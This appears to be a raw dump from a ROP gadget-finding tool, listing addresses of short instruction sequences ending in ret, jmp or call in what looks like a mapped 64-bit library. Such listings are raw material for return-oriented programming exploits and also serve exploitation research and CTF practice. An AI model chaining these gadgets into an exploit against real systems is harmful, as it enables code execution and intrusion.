0x00002aaaaab0eced : add byte ptr [rax - 1], bh ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabed99b : add byte ptr [rax - 1], bh ; pop rbx ; pop rbp ; ret
0x00002aaaaab08f0d : add byte ptr [rax - 1], bh ; pop rbx ; ret
0x00002aaaaab0a48d : add byte ptr [rax - 1], bh ; ret
0x00002aaaaab0b8c6 : add byte ptr [rax - 1], dil ; ret
0x00002aaaaac69b68 : add byte ptr [rax - 4], ah ; call qword ptr [rax + 0x20fffc5f]
0x00002aaaaac6f92f : add byte ptr [rax - 6], dh ; call rsp
0x00002aaaaac7e987 : add byte ptr [rax - 7], bh ; int1 ; call rsi
0x00002aaaaab4d0bf : add byte ptr [rax], 0 ; add al, ch ; clc ; ret
0x00002aaaaac0b2c4 : add byte ptr [rax], 0 ; add al, ch ; ret
0x00002aaaaab921f5 : add byte ptr [rax], 0 ; add al, ch ; ret 0x572
0x00002aaaaab54ef5 : add byte ptr [rax], 0 ; add al, ch ; ret 0x945
0x00002aaaaabf86f5 : add byte ptr [rax], 0 ; add al, ch ; ret 0xff0d
0x00002aaaaab404bb : add byte ptr [rax], 0 ; add bl, dh ; ret
0x00002aaaaab48ed9 : add byte ptr [rax], 0 ; add byte ptr [rax - 0x39], cl ; ret 0xffff
0x00002aaaaac1532f : add byte ptr [rax], 0 ; add byte ptr [rax - 0x75], cl ; add eax, 0x2840d6 ; call qword ptr [rax]
0x00002aaaaac14d1c : add byte ptr [rax], 0 ; add byte ptr [rax - 0x75], cl ; add eax, 0x2846e9 ; call qword ptr [rax]
0x00002aaaaab13a8d : add byte ptr [rax], 0 ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab4f3dd : add byte ptr [rax], 0 ; add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x00002aaaaaafeabd : add byte ptr [rax], 0 ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx + rcx*2], 0x39 ; ret
0x00002aaaaab62f7b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; bsf eax, eax ; add rax, rdi ; ret
0x00002aaaaac4954b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; call qword ptr [rbx]
0x00002aaaaab72e8b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; mov byte ptr [rdi], 0 ; mov rax, rdi ; ret
0x00002aaaaab505eb : add byte ptr [rax], 0 ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x00002aaaaabff45b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; mov eax, 1 ; pop rbx ; ret
0x00002aaaaac071bb : add byte ptr [rax], 0 ; add byte ptr [rax], al ; mov eax, 2 ; ret
0x00002aaaaac1056b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x28] ; ret
0x00002aaaaac2fc2b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab6a81b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; mov rax, rdi ; ret
0x00002aaaaac485db : add byte ptr [rax], 0 ; add byte ptr [rax], al ; mov rdi, qword ptr [r13 + 0x70] ; call 0x1f8b3
0x00002aaaaac2fa6b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaac2fd7b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x00002aaaaac2fd0b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; movzx edx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x00002aaaaab00d53 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaabf2ef3 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; xor eax, eax ; add rsp, 0x28 ; ret
0x00002aaaaac01e0b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab574e3 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab7f1d3 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab6ab9b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; xor rax, rax ; ret
0x00002aaaaab27c8a : add byte ptr [rax], 0 ; add byte ptr [rbx + 0x44], bl ; mov eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaab44c7e : add byte ptr [rax], 0 ; add byte ptr [rbx + 0x48], bl ; mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaab44e0b : add byte ptr [rax], 0 ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaab1ca0d : add byte ptr [rax], 0 ; add byte ptr [rbx - 0x77], bl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00002aaaaab447d6 : add byte ptr [rax], 0 ; add byte ptr [rcx + 0x415d5bd8], cl ; pop rsp ; ret
0x00002aaaaab0b2c6 : add byte ptr [rax], 0 ; add byte ptr [rcx + 0xf], al ; xchg eax, esi ; ret 0x394c
0x00002aaaaab9e21e : add byte ptr [rax], 0 ; add byte ptr [rcx + rcx*4 + 0x32], ah ; add rsp, 0x18 ; ret
0x00002aaaaab46033 : add byte ptr [rax], 0 ; add byte ptr [rcx + rcx*4 - 0x40], al ; pop rbx ; ret
0x00002aaaaab52f32 : add byte ptr [rax], 0 ; add byte ptr [rcx + rcx*4 - 0x40], cl ; ret
0x00002aaaaab8a063 : add byte ptr [rax], 0 ; add byte ptr [rcx - 0x7d], al ; ret
0x00002aaaaac42b61 : add byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab000ae : add byte ptr [rax], 0 ; add cl, ch ; ret 0xfffb
0x00002aaaaab3a892 : add byte ptr [rax], 0 ; add dh, dh ; ret
0x00002aaaaabeb159 : add byte ptr [rax], 0 ; je 0x116173 ; pop rbx ; mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaabec659 : add byte ptr [rax], 0 ; je 0x117673 ; pop rbx ; mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaab4282b : add byte ptr [rax], 0 ; je 0x6d840 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab430d5 : add byte ptr [rax], 0 ; je 0x6e105 ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaab44775 : add byte ptr [rax], 0 ; je 0x6f7a6 ; mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab44dc0 : add byte ptr [rax], 0 ; je 0x6fdd9 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab454f4 : add byte ptr [rax], 0 ; je 0x70508 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab45676 : add byte ptr [rax], 0 ; je 0x70688 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab45a73 : add byte ptr [rax], 0 ; je 0x70a8b ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaab45fea : add byte ptr [rax], 0 ; je 0x71001 ; mov eax, r8d ; pop rbx ; ret
0x00002aaaaab4618d : add byte ptr [rax], 0 ; je 0x711a8 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab46324 : add byte ptr [rax], 0 ; je 0x71338 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4ab82 : add byte ptr [rax], 0 ; je 0x75b98 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4af87 : add byte ptr [rax], 0 ; je 0x75f98 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4b0ab : add byte ptr [rax], 0 ; je 0x760c0 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab4b1ed : add byte ptr [rax], 0 ; je 0x76208 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab4b4d2 : add byte ptr [rax], 0 ; je 0x764e8 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4be77 : add byte ptr [rax], 0 ; je 0x76e88 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4d083 : add byte ptr [rax], 0 ; je 0x78098 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaabd2a3d : add byte ptr [rax], 0 ; lea rsp, qword ptr [rbp - 0x10] ; pop rbx ; pop r12 ; pop rbp ; ret
0x00002aaaaab45102 : add byte ptr [rax], 0 ; mov edx, eax ; je 0x7011a ; mov eax, edx ; pop rbx ; ret
0x00002aaaaac7d4e5 : add byte ptr [rax], 0 ; or byte ptr [rcx + rsi*8], bl ; jmp qword ptr [rcx]
0x00002aaaaac6b205 : add byte ptr [rax], 0 ; xchg eax, esp ; adc ch, dl ; jmp rsp
0x00002aaaaac5c3f0 : add byte ptr [rax], 0xf2 ; push qword ptr [rax - 0x1f000e00] ; add dl, dh ; call qword ptr [rax]
0x00002aaaaabfae89 : add byte ptr [rax], ah ; add bl, ch ; ret 0xb8
0x00002aaaaac7688f : add byte ptr [rax], ah ; add ebp, ebp ; call qword ptr [rsi]
0x00002aaaaac86e1f : add byte ptr [rax], ah ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac82c0f : add byte ptr [rax], ah ; fcomi st(4) ; call qword ptr [rbx]
0x00002aaaaac8362f : add byte ptr [rax], ah ; hlt ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac84aff : add byte ptr [rax], ah ; insb byte ptr [rdi], dx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8507f : add byte ptr [rax], ah ; jb 0x1b007c ; jmp qword ptr [rcx]
0x00002aaaaac851ff : add byte ptr [rax], ah ; je 0x1b01fc ; jmp qword ptr [rcx]
0x00002aaaaac7bd4f : add byte ptr [rax], ah ; jg 0x1a6d46 ; call qword ptr [rdi]
0x00002aaaaabe2b5e : add byte ptr [rax], ah ; jmp 0x10db28
0x00002aaaaab02e14 : add byte ptr [rax], ah ; movzx eax, ax ; ret
0x00002aaaaac7a87f : add byte ptr [rax], ah ; out dx, al ; call qword ptr [rdx]
0x00002aaaaac84e3f : add byte ptr [rax], ah ; outsd dx, dword ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac849bf : add byte ptr [rax], ah ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaaaddb0f : add byte ptr [rax], ah ; ret 0xf
0x00002aaaaac730ae : add byte ptr [rax], al ; adc al, 0 ; add byte ptr [rax], al ; jl 0x19e0f2 ; add byte ptr [rax], al ; clc ; ret
0x00002aaaaac7c17e : add byte ptr [rax], al ; adc al, 0 ; add byte ptr [rax], al ; ret 0
0x00002aaaaac7c1c6 : add byte ptr [rax], al ; adc al, 0 ; add byte ptr [rax], al ; xchg eax, esp ; ret 0
0x00002aaaaac8124a : add byte ptr [rax], al ; adc al, 0x13 ; add dword ptr [rax], eax ; sbb dl, 0xf3 ; jmp qword ptr [rcx]
0x00002aaaaac7194a : add byte ptr [rax], al ; adc al, 0x1a ; add byte ptr [rax], al ; adc byte ptr [rdi], 0xe9 ; jmp qword ptr [rax]
0x00002aaaaac76ec2 : add byte ptr [rax], al ; adc al, 0x1a ; add byte ptr [rax], al ; or byte ptr [rcx], bl ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac81c4a : add byte ptr [rax], al ; adc al, 0x1d ; add dword ptr [rax], eax ; mov al, 0x66 ; stc ; call qword ptr [rax]
0x00002aaaaac6b5ae : add byte ptr [rax], al ; adc al, 0x20 ; jmp 0x1965b8
0x00002aaaaac8384a : add byte ptr [rax], al ; adc al, 0x39 ; add dword ptr [rax], eax ; adc bh, bh ; hlt ; call rsi
0x00002aaaaac83e4a : add byte ptr [rax], al ; adc al, 0x3f ; add dword ptr [rax], eax ; rcr byte ptr [rdi], 1 ; cmc ; jmp qword ptr [rdx]
0x00002aaaaac84d4a : add byte ptr [rax], al ; adc al, 0x4e ; add dword ptr [rax], eax ; push rax ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac86e4a : add byte ptr [rax], al ; adc al, 0x6f ; add dword ptr [rax], eax ; push rax ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac6ba66 : add byte ptr [rax], al ; adc al, 0xa8 ; in eax, dx ; call rsp
0x00002aaaaac7bd4a : add byte ptr [rax], al ; adc al, 0xbe ; add byte ptr [rax], al ; and byte ptr [rdi - 0x11], bh ; call qword ptr [rdi]
0x00002aaaaac7ca4a : add byte ptr [rax], al ; adc al, 0xcb ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac6bc3e : add byte ptr [rax], al ; adc al, 0xd8 ; in eax, dx ; jmp rsp
0x00002aaaaac7dd4a : add byte ptr [rax], al ; adc al, 0xde ; add byte ptr [rax], al ; add byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaac7e44a : add byte ptr [rax], al ; adc al, 0xe5 ; add byte ptr [rax], al ; mov al, 0xe8 ; int1 ; call qword ptr [rbx]
0x00002aaaaac6bcf6 : add byte ptr [rax], al ; adc al, 0xfc ; in eax, dx ; call rsp
0x00002aaaaac7074a : add byte ptr [rax], al ; adc al, 8 ; add byte ptr [rax], al ; test bpl, al ; jmp qword ptr [rcx]
0x00002aaaaaada7e6 : add byte ptr [rax], al ; adc al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaaadc5fe : add byte ptr [rax], al ; adc al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 4
0x00002aaaaaad57b8 : add byte ptr [rax], al ; adc al, byte ptr [rax] ; add byte ptr [rbx + 1], al ; ret 0x102
0x00002aaaaac74bee : add byte ptr [rax], al ; adc byte ptr [rax - 0x15], dl ; call rdi
0x00002aaaaac6920e : add byte ptr [rax], al ; adc byte ptr [rax], al ; sti ; jmp rax
0x00002aaaaac74b0e : add byte ptr [rax], al ; adc byte ptr [rbx], dh ; jmp 0x19fb18
0x00002aaaaac710ce : add byte ptr [rax], al ; adc byte ptr [rcx - 3], dh ; jmp qword ptr [rdi]
0x00002aaaaac718ee : add byte ptr [rax], al ; adc byte ptr [rdi], 0xe9 ; call qword ptr [rbx]
0x00002aaaaac7194e : add byte ptr [rax], al ; adc byte ptr [rdi], 0xe9 ; jmp qword ptr [rax]
0x00002aaaaab0ad70 : add byte ptr [rax], al ; adc byte ptr [rdi], cl ; ret 0x8b48
0x00002aaaaaad57b4 : add byte ptr [rax], al ; adc byte ptr [rdx], ah ; add byte ptr [rax], al ; adc al, byte ptr [rax] ; add byte ptr [rbx + 1], al ; ret 0x102
0x00002aaaaac7dcfe : add byte ptr [rax], al ; adc byte ptr [rsi - 0xf], 0xff ; ret
0x00002aaaaac7107a : add byte ptr [rax], al ; adc dword ptr [rax], r8d ; add al, ah ; in eax, -0x18 ; call qword ptr [rdx]
0x00002aaaaaae3456 : add byte ptr [rax], al ; adc eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x16
0x00002aaaaac81219 : add byte ptr [rax], al ; add ah, ah ; adc al, byte ptr [rcx] ; add byte ptr [rax - 0x26], dl ; jmp qword ptr [rcx]
0x00002aaaaac90519 : add byte ptr [rax], al ; add ah, ah ; add eax, 0x74000002 ; clc ; call qword ptr [rdi]
0x00002aaaaac7ba19 : add byte ptr [rax], al ; add ah, ah ; mov edx, 0x75d00000 ; out dx, eax ; jmp qword ptr [rax]
0x00002aaaaac8ef19 : add byte ptr [rax], al ; add ah, ah ; out dx, eax ; add dword ptr [rax], eax ; rcl byte ptr [rdx], 0xf8 ; jmp qword ptr [rbx]
0x00002aaaaac7ca19 : add byte ptr [rax], al ; add ah, ah ; retf 0 ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac84ef9 : add byte ptr [rax], al ; add ah, al ; add qword ptr [r8], r8 ; adc byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac81ff9 : add byte ptr [rax], al ; add ah, al ; and byte ptr [rcx], al ; add al, dh ; xchg eax, ebx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7f4f9 : add byte ptr [rax], al ; add ah, al ; cmc ; add byte ptr [rax], al ; add byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac73af9 : add byte ptr [rax], al ; add ah, al ; cmp eax, dword ptr [rax] ; add al, ah ; xor al, 0xea ; jmp rax
0x00002aaaaac7d8f9 : add byte ptr [rax], al ; add ah, al ; fld dword ptr [rax] ; add byte ptr [rax + 0x30], ah ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac7ff0e : add byte ptr [rax], al ; add ah, al ; jmp qword ptr [rdi]
0x00002aaaaac86ff9 : add byte ptr [rax], al ; add ah, al ; jo 0x1b200a ; add al, ah ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac89ef9 : add byte ptr [rax], al ; add ah, al ; lahf ; add dword ptr [rax], eax ; and bl, 0xf6 ; jmp qword ptr [rdi]
0x00002aaaaac832f9 : add byte ptr [rax], al ; add ah, al ; xor eax, dword ptr [rcx] ; add byte ptr [rax - 0x17], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81231 : add byte ptr [rax], al ; add ah, bh ; adc al, byte ptr [rcx] ; add byte ptr [rax - 0x26], ch ; jmp qword ptr [rcx]
0x00002aaaaac755a9 : add byte ptr [rax], al ; add ah, bh ; add byte ptr [rax], al ; add al, dh ; mov bl, 0xec ; jmp qword ptr [rcx]
0x00002aaaaac84d31 : add byte ptr [rax], al ; add ah, bh ; add qword ptr [r8], r8 ; cmp byte ptr [rsi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac84c31 : add byte ptr [rax], al ; add ah, bh ; add qword ptr [rax], r8 ; cmp byte ptr [rbp - 0xb], ch ; call qword ptr [rax]
0x00002aaaaac84a31 : add byte ptr [rax], al ; add ah, bh ; add qword ptr [rax], rax ; cwde ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85031 : add byte ptr [rax], al ; add ah, bh ; push rax ; add dword ptr [rax], eax ; test al, 0x71 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85331 : add byte ptr [rax], al ; add ah, bh ; push rbx ; add dword ptr [rax], eax ; js 0x1b03ba ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac74f11 : add byte ptr [rax], al ; add ah, bl ; add byte ptr [r8], r8b ; pop rdi ; jmp 0x19ff25
0x00002aaaaac84111 : add byte ptr [rax], al ; add ah, bl ; add dword ptr [r8], eax ; call 0x241ae64f
0x00002aaaaac84f11 : add byte ptr [rax], al ; add ah, bl ; add qword ptr [r8], r8 ; sub byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac82011 : add byte ptr [rax], al ; add ah, bl ; and byte ptr [rcx], al ; add byte ptr [rax], cl ; xchg eax, esp ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7f511 : add byte ptr [rax], al ; add ah, bl ; cmc ; add byte ptr [rax], al ; sbb byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac83911 : add byte ptr [rax], al ; add ah, bl ; cmp dword ptr [rcx], eax ; add byte ptr [rax], bl ; add esi, ebp ; call qword ptr [rdi]
0x00002aaaaac83d11 : add byte ptr [rax], al ; add ah, bl ; cmp eax, 0x1e380001 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac87011 : add byte ptr [rax], al ; add ah, bl ; jo 0x1b2022 ; add al, bh ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac78a11 : add byte ptr [rax], al ; add ah, bl ; mov al, byte ptr [rax] ; add al, ch ; jg 0x1a3a12 ; call qword ptr [rcx]
0x00002aaaaac81121 : add byte ptr [rax], al ; add ah, ch ; adc dword ptr [rcx], eax ; add al, bl ; fpatan ; call qword ptr [rbx]
0x00002aaaaac84e21 : add byte ptr [rax], al ; add ah, ch ; add qword ptr [rax], r8 ; or byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac86f21 : add byte ptr [rax], al ; add ah, ch ; outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac78f21 : add byte ptr [rax], al ; add ah, ch ; pop qword ptr [rax] ; add al, bl ; mov ebp, gs ; jmp qword ptr [rax]
0x00002aaaaac85621 : add byte ptr [rax], al ; add ah, ch ; push rsi ; add dword ptr [rax], eax ; js 0x1b06af ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac71c21 : add byte ptr [rax], al ; add ah, ch ; sbb al, 0 ; add byte ptr [rax], bl ; cmp ch, cl ; call qword ptr [rsi]
0x00002aaaaac8fd21 : add byte ptr [rax], al ; add ah, ch ; std ; add dword ptr [rax], eax ; push rsp ; clc ; jmp qword ptr [rcx]
0x00002aaaaac7ab21 : add byte ptr [rax], al ; add ah, ch ; stosd dword ptr [rdi], eax ; add byte ptr [rax], al ; test al, 0x73 ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac88001 : add byte ptr [rax], al ; add ah, cl ; add byte ptr [rcx], 0 ; cmp byte ptr [rbx - 0xa], cl ; call qword ptr [rax]
0x00002aaaaac84501 : add byte ptr [rax], al ; add ah, cl ; add dword ptr [r8], r8d ; pop rax ; cmc ; jmp rax
0x00002aaaaac84c01 : add byte ptr [rax], al ; add ah, cl ; add qword ptr [rax], r8 ; sbb byte ptr [rbp - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac7d801 : add byte ptr [rax], al ; add ah, cl ; fadd dword ptr [rax] ; add byte ptr [rax + 0x25], bh ; int1 ; call qword ptr [rcx]
0x00002aaaaac7e501 : add byte ptr [rax], al ; add ah, cl ; in eax, 0 ; add byte ptr [rax - 0x17], bl ; int1 ; jmp qword ptr [rdi]
0x00002aaaaac7b101 : add byte ptr [rax], al ; add ah, cl ; mov cl, 0 ; add byte ptr [rax - 0x23], ch ; out dx, al ; jmp qword ptr [rsi]
0x00002aaaaac85001 : add byte ptr [rax], al ; add ah, cl ; push rax ; add dword ptr [rax], eax ; jno 0x1b000a ; jmp qword ptr [rcx]
0x00002aaaaac72801 : add byte ptr [rax], al ; add ah, cl ; sub byte ptr [rax], al ; add byte ptr [rax], bl ; xchg cl, ch ; jmp qword ptr [rcx]
0x00002aaaaac7f601 : add byte ptr [rax], al ; add ah, cl ; test byte ptr [rax], 0 ; cmp byte ptr [rdx], ch ; jmp qword ptr [rdi]
0x00002aaaaac83001 : add byte ptr [rax], al ; add ah, cl ; xor byte ptr [rcx], al ; add byte ptr [rax - 0x1d], cl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac84729 : add byte ptr [rax], al ; add ah, dh ; add dword ptr [r8], r8d ; loopne 0x1af78f ; cmc ; call qword ptr [rdx]
0x00002aaaaac82e29 : add byte ptr [rax], al ; add ah, dh ; add dword ptr cs:[rax], eax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaac83629 : add byte ptr [rax], al ; add ah, dh ; add dword ptr ss:[rax], eax ; and ah, dh ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac84f29 : add byte ptr [rax], al ; add ah, dh ; add qword ptr [r8], r8 ; jo 0x1aff32 ; jmp qword ptr [rcx]
0x00002aaaaac7f529 : add byte ptr [rax], al ; add ah, dh ; cmc ; add byte ptr [rax], al ; xor byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac83d29 : add byte ptr [rax], al ; add ah, dh ; cmp eax, 0x1e500001 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac87029 : add byte ptr [rax], al ; add ah, dh ; jo 0x1b203a ; add byte ptr [rax], dl ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac7ac29 : add byte ptr [rax], al ; add ah, dh ; lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; push rax ; jle 0x1a5c2b ; jmp qword ptr [rcx]
0x00002aaaaac74b09 : add byte ptr [rax], al ; add ah, dl ; add byte ptr [r8], al ; adc byte ptr [rbx], dh ; jmp 0x19fb1d
0x00002aaaaac75881 : add byte ptr [rax], al ; add ah, dl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x30], bl ; in al, dx ; jmp rbx
0x00002aaaaac72409 : add byte ptr [rax], al ; add ah, dl ; and al, 0 ; add byte ptr [rax], al ; jle 0x19d406 ; jmp qword ptr [rsi]
0x00002aaaaac7f409 : add byte ptr [rax], al ; add ah, dl ; hlt ; add byte ptr [rax], al ; shl byte ptr [rdx], 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac85109 : add byte ptr [rax], al ; add ah, dl ; push rcx ; add dword ptr [rax], eax ; loopne 0x1b018e ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac81c09 : add byte ptr [rax], al ; add ah, dl ; sbb al, 1 ; add al, ah ; stc ; call qword ptr [rax]
0x00002aaaaac82c09 : add byte ptr [rax], al ; add ah, dl ; sub al, 1 ; add byte ptr [rax], ah ; fcomi st(4) ; call qword ptr [rbx]
0x00002aaaaaae031e : add byte ptr [rax], al ; add al, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x4f
0x00002aaaaac7363a : add byte ptr [rax], al ; add al, 0x37 ; add byte ptr [rax], al ; or ch, 0xe9 ; call qword ptr [rdx]
0x00002aaaaac84e3a : add byte ptr [rax], al ; add al, 0x4f ; add dword ptr [rax], eax ; and byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac6c1a6 : add byte ptr [rax], al ; add al, 0x72 ; out dx, al ; call rsp
0x00002aaaaac6b91e : add byte ptr [rax], al ; add al, 0x77 ; in eax, dx ; jmp rsp
0x00002aaaaac6c1f6 : add byte ptr [rax], al ; add al, 0x78 ; out dx, al ; call rsp
0x00002aaaaac6b71e : add byte ptr [rax], al ; add al, 0xa6 ; jmp 0x196728
0x00002aaaaac5b45d : add byte ptr [rax], al ; add al, al ; pop rcx ; out dx, al ; jmp rax
0x00002aaaaac5a515 : add byte ptr [rax], al ; add al, bh ; loope 0x185520 ; jmp qword ptr [rdi]
0x00002aaaaac5a595 : add byte ptr [rax], al ; add al, bh ; loope 0x1855a0 ; jmp qword ptr [rdi]
0x00002aaaaac5a615 : add byte ptr [rax], al ; add al, bh ; loope 0x185620 ; jmp qword ptr [rdi]
0x00002aaaaac82b87 : add byte ptr [rax], al ; add al, byte ptr [rcx + 0x283100e] ; push rsp ; ret
0x00002aaaaabe5ab3 : add byte ptr [rax], al ; add al, byte ptr [rcx - 1] ; push rbp ; sub byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab4d0c0 : add byte ptr [rax], al ; add al, ch ; clc ; ret
0x00002aaaaabcec8d : add byte ptr [rax], al ; add al, ch ; fisttp dword ptr [rsi] ; stc ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaab44348 : add byte ptr [rax], al ; add al, ch ; les eax, ptr [rip - 0x763f7b00] ; ret 0x8389
0x00002aaaaab08540 : add byte ptr [rax], al ; add al, ch ; pop rax ; ret
0x00002aaaaab31485 : add byte ptr [rax], al ; add al, ch ; ret
0x00002aaaaab921f6 : add byte ptr [rax], al ; add al, ch ; ret 0x572
0x00002aaaaab54ef6 : add byte ptr [rax], al ; add al, ch ; ret 0x945
0x00002aaaaab44646 : add byte ptr [rax], al ; add al, ch ; ret 0xa1
0x00002aaaaac00456 : add byte ptr [rax], al ; add al, ch ; ret 0xcd
0x00002aaaaaaffca6 : add byte ptr [rax], al ; add al, ch ; ret 0xea
0x00002aaaaac0d956 : add byte ptr [rax], al ; add al, ch ; ret 0xef5c
0x00002aaaaabc7826 : add byte ptr [rax], al ; add al, ch ; ret 0xf2cf
0x00002aaaaab81b76 : add byte ptr [rax], al ; add al, ch ; ret 0xf810
0x00002aaaaabf86f6 : add byte ptr [rax], al ; add al, ch ; ret 0xff0d
0x00002aaaaab4b76b : add byte ptr [rax], al ; add al, ch ; std ; imul edi, ebp, 0x89c085ff ; ret
0x00002aaaaac755ad : add byte ptr [rax], al ; add al, dh ; mov bl, 0xec ; jmp qword ptr [rcx]
0x00002aaaaac5c38d : add byte ptr [rax], al ; add al, dl ; cld ; int1 ; push rax ; cld ; int1 ; call qword ptr [rax]
0x00002aaaaabff3c0 : add byte ptr [rax], al ; add bh, al ; adc al, 0x10 ; add byte ptr [rax], al ; add cl, ch ; ret
0x00002aaaaaaf68fd : add byte ptr [rax], al ; add bh, al ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaabc1feb : add byte ptr [rax], al ; add bh, al ; or byte ptr [rsi], cl ; add byte ptr [rax], al ; add cl, ch ; ret
0x00002aaaaac4954d : add byte ptr [rax], al ; add bh, bh ; adc ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaac0666a : add byte ptr [rax], al ; add bh, bh ; loope 0x131607 ; ret
0x00002aaaaab4f3d8 : add byte ptr [rax], al ; add bh, bh ; nop ; add byte ptr [rax], 0 ; add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x00002aaaaaba8c43 : add byte ptr [rax], al ; add bh, dh ; dec byte ptr [rbx - 0x7c97dba4] ; ret 0x8d01
0x00002aaaaabab6bb : add byte ptr [rax], al ; add bh, dh ; ret
0x00002aaaaaba2e8a : add byte ptr [rax], al ; add bl, al ; mov eax, 0xffffffff ; ret
